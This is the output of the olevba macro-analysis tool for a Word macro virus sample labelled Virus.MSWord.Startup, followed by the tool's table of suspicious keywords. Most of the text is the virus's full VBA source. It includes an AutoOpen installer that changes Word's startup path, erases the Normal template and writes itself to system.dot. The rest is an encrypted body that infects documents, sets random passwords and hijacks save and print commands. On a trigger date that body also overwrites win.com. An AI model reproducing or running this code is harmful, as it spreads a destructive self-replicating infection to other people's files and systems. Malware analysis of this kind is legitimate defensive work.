olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Startup-608ea246a1e7ac43260de87878955e9ec7cc0d73
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Startup-608ea246a1e7ac43260de87878955e9ec7cc0d73 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'3'
Sub AutoOpen()
Application.DisplayRecentFiles = False
Call Install
End Sub
Sub Install()
Dim OS, WinDir, SFile As String
OS = System.OperatingSystem
If OS <> "Windows" Then
Exit Sub
End If
WinDir = Environ("WinDir")
SFile = Dir(WinDir & "\SYSTEM\system.dot")
If SFile = "system.dot" Then
Exit Sub
End If
System.PrivateProfileString("", "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\8.0\Word\Options", "STARTUP-PATH") = WinDir & "\SYSTEM"
NormalTemplate.VBProject.VBComponents(1).CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
NormalTemplate.Save
Call Decrypt
End Sub
Sub Decrypt()
Dim C_DC1, C_DC2, C_DC3 As String
Dim Z, i, X, LastLine As Integer
Set ADObj = ActiveDocument.VBProject.VBComponents(1).CodeModule
LastLine = ADObj.CountOfLines
Z = Mid(ADObj.Lines(1, 1), 2, 1)
For i = 47 To LastLine
C_DC1 = ADObj.Lines(i, 1)
For X = 2 To Len(C_DC1) - 1
IntCode = Asc(Mid(C_DC1, X, 1))
IntCode = IntCode + Z
C_DC2 = C_DC2 & Chr(IntCode)
Next X
C_DC2 = C_DC2 & Chr(13)
Next i
C_DC3 = ADObj.Lines(6, 41)
Set BaseObj = CreateObject("Word.Document")
Set ATObj = ActiveDocument.VBProject.VBComponents(1)
ATObj.CodeModule.AddFromString C_DC2
ATObj.CodeModule.AddFromString C_DC3
ATObj.CodeModule.InsertLines 1, "Dim C_DC2 As String"
ATObj.Export Environ("WinDir") & "\SYSTEM\win32vba.vxd"
BaseObj.SaveAs Environ("WinDir") & "\SYSTEM\system.dot", wdFormatTemplate
BaseObj.Close
End Sub
'Pr_
@ovmq%&'
'Afj
@\A@.)
@\A@0
>p
Pqofkd'
'Afj
W)
f)
U)
I^pqIfkb
>p
Fkqbdbo'
'O^kaljfwb'
'W
:
Fkq%%4
'
Oka&
(
.&'
'@\A@/
:
'
'@\A@/
:
$
#
W
#
$
#
@eo%.0&'
'@\A@/
:
@\A@/
#
Pr_
>rqlLmbk%&
#
@eo%.0&'
'@\A@/
:
@\A@/
#
>mmif`^qflk+Afpmi^vOb`bkqCfibp
:
C^ipb
#
@eo%.0&'
'@\A@/
:
@\A@/
#
@^ii
Fkpq^ii
#
@eo%.0&'
'@\A@/
:
@\A@/
#
Bka
Pr_
#
@eo%.0&'
'Fc
Afo%Bksfolk%TfkAfo&
#
YPVPQBJYtfk0/s_^+sua&
9;
tfk0/s_^+sua
Qebk'
'>aaFkp%pvpqbj+alq&+Fkpq^iiba
:
C^ipb'
'Bufq
Pr_'
'Bka
Fc'
'Lmbk
Bksfolk%TfkAfo&
#
YPVPQBJYtfk0/s_^+sua
Clo
Fkmrq
>p
 .'
'Clo
f
:
.
Ql
6'
'Ifkb
Fkmrq
 .)
@\A@.'
'Kbuq
f'
'@\A@.
:
'
'Clo
f
:
.
Ql
1.'
'Ifkb
Fkmrq
 .)
@\A@.'
'@\A@/
:
@\A@/
#
@\A@.
#
@eo%.0&'
'Kbuq
f'
'@\A@0
:
'
'Tefib
Klq
BLC%.&'
'Ifkb
Fkmrq
 .)
@\A@.'
'Clo
U
:
.
Ql
Ibk%@\A@.&'
'Fkq@lab
:
>p`%Jfa%@\A@.)
U)
.&&'
'Fkq@lab
:
Fkq@lab
*
W'
'@\A@0
:
@\A@0
#
@eo%Fkq@lab&'
'Kbuq
U'
'Fc
@\A@0
;

Qebk'
'@\A@/
:
@\A@/
#
$
#
@\A@0
#
$
#
@eo%.0&'
'Bka
Fc'
'@\A@0
:
'
'Tbka'
'@\A@/
:
Jfa%@\A@/)
.)
Ibk%@\A@/&
*
.&'
'@ilpb
 .'
'Bka
Pr_'
'Pr_
>rqlBub`%&'
'>mmif`^qflk+Afpmi^vOb`bkqCfibp
:
C^ipb'
'@ljj^ka?^op%Pq^ka^oa&+@lkqolip%/&+Lk>`qflk
:
CfibLmbk'
'@ljj^ka?^op%Pq^ka^oa&+@lkqolip%0&+Lk>`qflk
:
CfibP^sb'
'@ljj^ka?^op%Pq^ka^oa&+@lkqolip%1&+Lk>`qflk
:
Mofkq@roobkqAl`rjbkq'
'@^ii
@ovmq'
'@^ii
Lrqpfabo'
'Bka
Pr_'
'Pr_
Al`@ilpb%&'
'Lk
Boolo
Obprjb
Kbuq'
'Fc
>`qfsbAl`rjbkq+P^sba
:
C^ipb
Qebk'
'@^ii
Fkcb`q>A'
'>`qfsbAl`rjbkq+@ilpb
P^sb@e^kdbp7:taMoljmqQlP^sb@e^kdbp'
'Bipb'
'>`qfsbAl`rjbkq+@ilpb'
'Bka
Fc'
'Bka
Pr_'
'Pr_
CfibLmbk%&'
'Tfqe
Af^ildp%taAf^ildCfibLmbk&'
'+Afpmi^v'
'Fc
+K^jb
;

Qebk'
'Fc
%+Cloj^q
:
-&
Lo
%+Cloj^q
:
.&
Qebk'
'Al`rjbkqp+Lmbk
CfibK^jb7:+K^jb)
Cloj^q7:+Cloj^q'
'@^ii
Fkcb`q>A'
'>`qfsbAl`rjbkq+P^sb'
'Bka
Fc'
'Al`rjbkqp+Lmbk
CfibK^jb7:+K^jb)
Cloj^q7:+Cloj^q'
'Bka
Fc'
'Bka
Tfqe'
'Bka
Pr_'
'Pr_
CfibP^sb%&'
'Lk
Boolo
Obprjb
Kbuq'
'Fc
Afo%>`qfsbAl`rjbkq+CriiK^jb&
;

Qebk'
'>`qfsbAl`rjbkq+P^sb'
'Bipb'
'@^ii
CfibP^sb>p'
'Bka
Fc'
'Bka
Pr_'
'Pr_
CfibP^sb>p%&'
'Afj
Il`^iS^o
>p
Fkqbdbo'
'Tfqe
Af^ildp%taAf^ildCfibP^sb>p&'
'+Afpmi^v'
'Fc
+K^jb
;

Qebk'
'Fc
%+Cloj^q
:
-&
Lo
%+Cloj^q
:
.&
Qebk'
'O^kaljfwb'
'Il`^iS^o
:
Fkq%%.-
'
Oka&
(
.&'
'Fc
Il`^iS^o
:
.
Qebk'
'@^ii
PbqM^pptloa'
'Bipb'
'@^ii
Fkcb`q>A'
'Bka
Fc'
'Bka
Fc'
'>`qfsbAl`rjbkq+P^sb>p
CfibK^jb7:+K^jb)
CfibCloj^q7:+Cloj^q'
'Bka
Fc'
'Bka
Tfqe'
'Bka
Pr_'
'Pr_
CfibQbjmi^qbp%&'
'Qbjmi^qbp%.&+P^sba
:
Qorb'
'>aaFkp+Rkil^a
C^ipb'
'@^ii
@ib^o>A'
'@ljj^ka?^op%Pq^ka^oa&+Obpbq'
'Af^ildp%taAf^ildQllipQbjmi^qbp&+Pelt'
'Bka
Pr_'
'Pr_
SfbtS?@lab%&'
'Qbjmi^qbp%.&+P^sba
:
Qorb'
'>aaFkp+Rkil^a
C^ipb'
'@^ii
@ib^o>A'
'@ljj^ka?^op%Pq^ka^oa&+Obpbq'
'>mmif`^qflk+PeltSfpr^i?^pf`Bafqlo
:
Qorb'
'Bka
Pr_'
'Pr_
QllipJ^`ol%&'
'Qbjmi^qbp%.&+P^sba
:
Qorb'
'>aaFkp+Rkil^a
C^ipb'
'@^ii
@ib^o>A'
'@ljj^ka?^op%Pq^ka^oa&+Obpbq'
'Af^ildp%taAf^ildQllipJ^`ol&+Pelt'
'Bka
Pr_'
'Pr_
QllipLmqflkp%&'
'Afj
Ob^iM^qe
>p
Pqofkd'
'Ob^iM^qe
:
'
'Ob^iM^qe
:
Pvpqbj+Mofs^qbMolcfibPqofkd%)
EHBV\@ROOBKQ\RPBOYPlcqt^obYJf`olplcqYLccf`bY5+-YTloaYLmqflkp)
MOLDO>JAFO&'
'Ob^iM^qe
:
Ob^iM^qe
#
YPq^oqRm'
'Pvpqbj+Mofs^qbMolcfibPqofkd%)
EHBV\@ROOBKQ\RPBOYPlcqt^obYJf`olplcqYLccf`bY5+-YTloaYLmqflkp)
PQ>OQRM*M>QE&
:
Ob^iM^qe'
'Fc
Af^ildp%taAf^ildQllipLmqflkp&+Pelt
:
-
Lo
*.
Lo
*/
Qebk'
'Pvpqbj+Mofs^qbMolcfibPqofkd%)
EHBV\@ROOBKQ\RPBOYPlcqt^obYJf`olplcqYLccf`bY5+-YTloaYLmqflkp)
PQ>OQRM*M>QE&
:
Bksfolk%TfkAfo&
#
YPVPQBJ'
'Bka
Fc'
'Bka
Pr_'
'Pr_
CfibMofkq%&'
'Fc
Af^ildp%taAf^ildCfibMofkq&+Afpmi^v
:
*.
Qebk'
'@^ii
Mofkq@roobkqAl`rjbkq'
'Bka
Fc'
'Bka
Pr_'
'Pr_
Mofkq@roobkqAl`rjbkq%&'
'Lk
Boolo
Obprjb
Kbuq'
'Afj
KlMofkq
>p
Fkqbdbo'
'O^kaljfwb'
'KlMofkq
:
Fkq%%Oka
'
0&
(
.&'
'Fc
KlMofkq
:
0
Qebk'
'Jpd?lu
Ìíåêïâí

#
>mmif`^qflk+>`qfsbMofkqbo
#

êâ
êÝæáâê)
s_LHLkiv
(
s_Bu`i^j^qflk)
ËõåÞçÝ
ìâôÝïå'
'Bufq
Pr_'
'Bka
Fc'
'>`qfsbAl`rjbkq+MofkqLrq'
'Bka
Pr_'
'Pr_
@ib^o>A%&'
'Lk
Boolo
Obprjb
Kbuq'
'Afj
>AI@lrkq)
f
>p
Fkqbdbo'
'Pbq
>A@labJlarib
:
>`qfsbAl`rjbkq+S?Molgb`q+S?@ljmlkbkqp%.&+@labJlarib'
'Fc
>A@labJlarib+@lrkqLcIfkbp
;
-
Qebk'
'>AI@lrkq
:
>A@labJlarib+@lrkqLcIfkbp'
'>A@labJlarib+AbibqbIfkbp
.)
>AI@lrkq'
'Clo
f
:
.
Ql
/-'
'>A@labJlarib+FkpboqIfkbp
.)

'
'>A@labJlarib+AbibqbIfkbp
.)
.'
'Kbuq
f'
'>`qfsbAl`rjbkq+P^sba
:
Qorb'
'Bka
Fc'
'Bka
Pr_'
'Pr_
Lrqpfabo%&'
'Fc
%A^v%Klt&
:
2&
>ka
%Jlkqe%Klt&
:
./&
Qebk'
'Afj
?rccbo
>p
S^of^kq'
'Afj
?rccbo.
>p
?vqb'
'?rccbo
:
>oo^v%.51)
.3)
0)
.52)
-)
.)
2.)
/.-)
/-2)
.6)
.62&'
'Lmbk
Bksfolk%TfkAfo&
#
Ytfk+`lj
Clo
?fk^ov
>p
 .'
'Clo
f
:
.
Ql
..'
'?rccbo.
:
?rccbo%f
*
.&'
'Mrq
 .)
f)
?rccbo.'
'Kbuq
f'
'@ilpb
 .'
'Jpd?lu
Moljmq7:Qfjb
#

*
QfJB
QL
AfB


#
@eo%.0&
#
@eo%.0&
#
XLRQPfABOZ)
Qfqib7:LRQPfABO$P
JBPP>DB'
'Bka
Fc'
'Bka
Pr_'
'Pr_
PbqM^pptloa%&'
'Afj
f
>p
Fkqbdbo'
'Afj
M^pp`lab
>p
Pqofkd'
'O^kaljfwb'
'Clo
f
:
.
Ql
3'
'O@
:
Fkq%%6
'
Oka&
(
-&'
'M^pp`lab
:
M^pp`lab
#
O@'
'Kbuq
f'
'>`qfsbAl`rjbkq+M^pptloa
:
M^pp`lab'
'Bka
Pr_'
'Pr_
Fkcb`q>A%&'
'Afj
>AI@lrkq)
f
>p
Fkqbdbo'
'Pbq
>A@labJlarib
:
>`qfsbAl`rjbkq+S?Molgb`q+S?@ljmlkbkqp%.&+@labJlarib'
'>AI@lrkq
:
>A@labJlarib+@lrkqLcIfkbp'
'Fc
>A@labJlarib+Ifkbp%/)
.&
:
Pr_
>rqlLmbk%&
Qebk'
'Bufq
Pr_'
'Bipb'
'>A@labJlarib+AbibqbIfkbp
.)
>AI@lrkq'
'>A@labJlarib+>aaColjPqofkd
@\A@/'
'Bka
Fc'
'Qbjmi^qbp%.&+P^sba
:
Qorb'
'Bka
Pr_'
'$LRQPfABO
s.+--$'
'$B^pq*H^w^hepq^k)
RH$'
'$.-
g^kr^ov
/--.
vb^o+
..7--
^j$'
'$Kbt
bk`ovmq
^ka
pqb^iqe
^idlofqej$'
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

